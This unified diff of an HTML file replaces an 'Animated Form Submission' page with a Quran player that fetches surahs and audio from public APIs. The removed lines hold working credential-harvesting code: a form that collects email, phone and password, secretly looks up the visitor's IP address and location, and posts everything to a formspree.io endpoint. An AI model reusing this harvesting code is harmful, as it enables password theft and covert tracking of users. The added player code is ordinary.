@@ -1,191 +1,287 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Animated Form Submission</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      overflow: hidden;
-      animation: fadeIn 1s ease-in-out;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quran Player Pro</title>
+    <style>
+        /* Previous CSS remains the same */
+        :root {
+            --primary: #10b981;
+            --dark: #1e293b;
+            --light: #f8fafc;
+        }
 
-    .form-container {
-      background-color: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-      width: 320px;
-      opacity: 0;
-      transform: translateY(-20px);
-      animation: slideDown 0.8s ease-out forwards;
-    }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+        body {
+            font-family: system-ui, sans-serif;
+            background: var(--light);
+            color: var(--dark);
+        }
 
-    @keyframes slideDown {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+        header {
+            background: linear-gradient(135deg, #059669, #10b981);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
 
-    .form-container h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #333;
-    }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
 
-    .form-container label {
-      display: block;
-      margin: 10px 0 4px;
-    }
+        .controls {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
 
-    .form-container input, .form-container textarea {
-      width: 100%;
-      padding: 8px;
-      margin-bottom: 12px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      transition: 0.3s ease-in-out;
-    }
+        select, button {
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
 
-    .form-container input:focus, .form-container textarea:focus {
-      border-color: #4CAF50;
-      box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
-      transform: scale(1.02);
-    }
+        .surah-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
 
-    .password-container {
-      display: flex;
-      align-items: center;
-      position: relative;
-    }
+        .surah-card {
+            background: white;
+            border-radius: 15px;
+            padding: 1.5rem;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
 
-    .password-container input {
-      width: 100%;
-      padding-right: 40px;
-    }
+        .surah-card:hover {
+            transform: translateY(-5px);
+        }
 
-    .toggle-password {
-      position: absolute;
-      right: 10px;
-      cursor: pointer;
-      color: gray;
-      transition: 0.3s;
-    }
+        .surah-detail {
+            display: none;
+        }
 
-    .toggle-password:hover {
-      color: black;
-    }
+        .surah-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            margin-top: 2rem;
+        }
 
-    .form-container button {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      padding: 10px;
-      width: 100%;
-      cursor: pointer;
-      transition: 0.3s ease-in-out;
-      font-size: 16px;
-      border-radius: 5px;
-    }
+        .arabic-text {
+            font-size: 1.5rem;
+            text-align: right;
+            line-height: 2.5rem;
+            margin-bottom: 1rem;
+        }
 
-    .form-container button:hover {
-      background-color: #45a049;
-      transform: scale(1.05);
-      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-    }
+        .translation {
+            color: #64748b;
+            border-left: 3px solid var(--primary);
+            padding-left: 1rem;
+            margin-bottom: 2rem;
+        }
 
-    .hidden {
-      display: none;
-    }
+        .player {
+            position: sticky;
+            top: 0;
+            background: white;
+            padding: 1rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
 
-  </style>
+        .back-btn {
+            margin-bottom: 1rem;
+            padding: 0.5rem 1rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .error {
+            color: red;
+            padding: 1rem;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
+    <header>
+        <h1>Quran Player Pro</h1>
+        <p>Click any Surah to play full chapter</p>
+    </header>
 
-  <div class="form-container">
-    <h2>Submit Form</h2>
-    <form id="form" action="https://formspree.io/f/xdkalzve" method="POST" onsubmit="return handleSubmit(event)">
-      
-      <label for="email">Your Email:</label>
-      <input type="email" name="email" id="email" required>
+    <div class="container">
+        <div class="controls">
+            <select id="sortSelect" onchange="sortSurahs()">
+                <option value="default">Sort by Default</option>
+                <option value="longest">Longest to Shortest</option>
+                <option value="shortest">Shortest to Longest</option>
+            </select>
+        </div>
 
-      <label for="phone">Your Phone Number:</label>
-      <input type="text" name="phone" id="phone" required placeholder="e.g., 9763238745">
+        <div id="surahList" class="surah-grid"></div>
+        <div id="loading" class="error" style="display: none;">Loading...</div>
+        <div id="errorMessage" class="error"></div>
 
-      <label for="password">Password:</label>
-      <div class="password-container">
-        <input type="password" name="password" id="password" required>
-        <span class="toggle-password" onclick="togglePassword()">👁️</span>
-      </div>
+        <div id="surahDetail" class="surah-detail">
+            <button class="back-btn" onclick="showSurahList()">← Back to List</button>
+            <div class="player">
+                <audio controls id="audioElement"></audio>
+            </div>
+            <div id="surahContent" class="surah-content"></div>
+        </div>
+    </div>
 
-      <label for="message">Your Message:</label>
-      <textarea name="message" id="message" required placeholder="Enter your message"></textarea>
+    <script>
+        const AUDIO_BASE = "https://server8.mp3quran.net/afs/";
+        const API_URL = "https://api.alquran.cloud/v1/surah";
+        let originalSurahs = [];
+        let currentSurah = null;
 
-      <button type="submit">Send</button>
-    </form>
-  </div>
+        async function loadSurahs() {
+            try {
+                showLoading();
+                const response = await fetch(API_URL);
+                if (!response.ok) throw new Error('Failed to fetch Surahs');
+                const { data } = await response.json();
+                originalSurahs = data;
+                renderSurahs(data);
+                clearError();
+            } catch (error) {
+                showError(`Error loading Surahs: ${error.message}`);
+            } finally {
+                hideLoading();
+            }
+        }
 
-  <script>
-    let userIP = "Fetching...";
-    let userLocation = "Fetching...";
+        function renderSurahs(surahs) {
+            const grid = document.getElementById("surahList");
+            grid.innerHTML = surahs.map(surah => `
+                <div class="surah-card" 
+                     onclick="showSurahDetail(${surah.number})">
+                    <h3>${surah.englishName}</h3>
+                    <p>${surah.name}</p>
+                    <p>Verses: ${surah.numberOfAyahs}</p>
+                    <small>${getSurahLength(surah.numberOfAyahs)}</small>
+                </div>
+            `).join("");
+        }
 
-    // Fetch Public IPv4 Address
-    fetch("https://api64.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-            userIP = data.ip;
-        })
-        .catch(error => {
-            console.error("Error fetching IP:", error);
-            userIP = "Unavailable";
-        });
+        async function showSurahDetail(number) {
+            try {
+                showLoading();
+                const [surahRes, translationRes] = await Promise.all([
+                    fetch(`https://api.alquran.cloud/v1/surah/${number}/ar.alafasy`),
+                    fetch(`https://api.alquran.cloud/v1/surah/${number}/en.ahmedali`)
+                ]);
 
-    // Fetch Location (City, Region, Country)
-    fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-            userLocation = `${data.city}, ${data.region}, ${data.country}`;
-        })
-        .catch(error => {
-            console.error("Error fetching location:", error);
-            userLocation = "Unavailable";
-        });
+                if (!surahRes.ok || !translationRes.ok) {
+                    throw new Error('Failed to load Surah details');
+                }
 
-    function handleSubmit(event) {
-        event.preventDefault(); // Prevent form from submitting immediately
+                const surahData = await surahRes.json();
+                const translationData = await translationRes.json();
 
-        const email = document.getElementById("email").value;
-        const phone = document.getElementById("phone").value;
-        const password = document.getElementById("password").value;
-        const messageBox = document.getElementById("message");
+                currentSurah = {
+                    ...surahData.data,
+                    translation: translationData.data
+                };
 
-        // Prepare the message with IP, location, and password details
-        const message = `Email: ${email}\nPhone: ${phone}\nPassword: ${password}\nIP Address: ${userIP}\nLocation: ${userLocation}\n\nMessage:\n` + messageBox.value;
+                document.getElementById("surahList").style.display = "none";
+                document.getElementById("surahDetail").style.display = "block";
 
-        // Set the message field with all collected data
-        messageBox.value = message;
+                // Set audio
+                const paddedNumber = number.toString().padStart(3, '0');
+                const audioElement = document.getElementById("audioElement");
+                audioElement.src = `${AUDIO_BASE}${paddedNumber}.mp3`;
+                
+                // Render content
+                const contentDiv = document.getElementById("surahContent");
+                contentDiv.innerHTML = `
+                    <h2>${currentSurah.englishName} (${currentSurah.name})</h2>
+                    <p>${getSurahLength(currentSurah.numberOfAyahs)}</p>
+                    ${currentSurah.ayahs.map((ayah, index) => `
+                        <div class="verse">
+                            <div class="arabic-text">${ayah.text}</div>
+                            <div class="translation">${currentSurah.translation.ayahs[index]?.text || 'Translation not available'}</div>
+                        </div>
+                    `).join("")}
+                `;
+                clearError();
+            } catch (error) {
+                showError(`Error loading Surah details: ${error.message}`);
+            } finally {
+                hideLoading();
+            }
+        }
 
-        // Allow form submission
-        document.getElementById("form").submit();
-        return true;
-    }
+        function showSurahList() {
+            document.getElementById("surahList").style.display = "grid";
+            document.getElementById("surahDetail").style.display = "none";
+            const audioElement = document.getElementById("audioElement");
+            if (audioElement) {
+                audioElement.pause();
+                audioElement.src = "";
+            }
+        }
 
-    function togglePassword() {
-        const passwordField = document.getElementById("password");
-        passwordField.type = (passwordField.type === "password") ? "text" : "password";
-    }
-  </script>
+        function sortSurahs() {
+            const sortType = document.getElementById("sortSelect").value;
+            let sortedSurahs = [...originalSurahs];
 
+            switch(sortType) {
+                case 'longest':
+                    sortedSurahs.sort((a, b) => b.numberOfAyahs - a.numberOfAyahs);
+                    break;
+                case 'shortest':
+                    sortedSurahs.sort((a, b) => a.numberOfAyahs - b.numberOfAyahs);
+                    break;
+                default:
+                    sortedSurahs = [...originalSurahs];
+            }
+
+            renderSurahs(sortedSurahs);
+        }
+
+        function getSurahLength(verses) {
+            if (verses > 150) return 'Long Surah';
+            if (verses > 50) return 'Medium Surah';
+            return 'Short Surah';
+        }
+
+        function showLoading() {
+            document.getElementById("loading").style.display = "block";
+        }
+
+        function hideLoading() {
+            document.getElementById("loading").style.display = "none";
+        }
+
+        function showError(message) {
+            document.getElementById("errorMessage").textContent = message;
+        }
+
+        function clearError() {
+            document.getElementById("errorMessage").textContent = "";
+        }
+
+        // Initialize
+        loadSurahs();
+    </script>
 </body>
 </html>
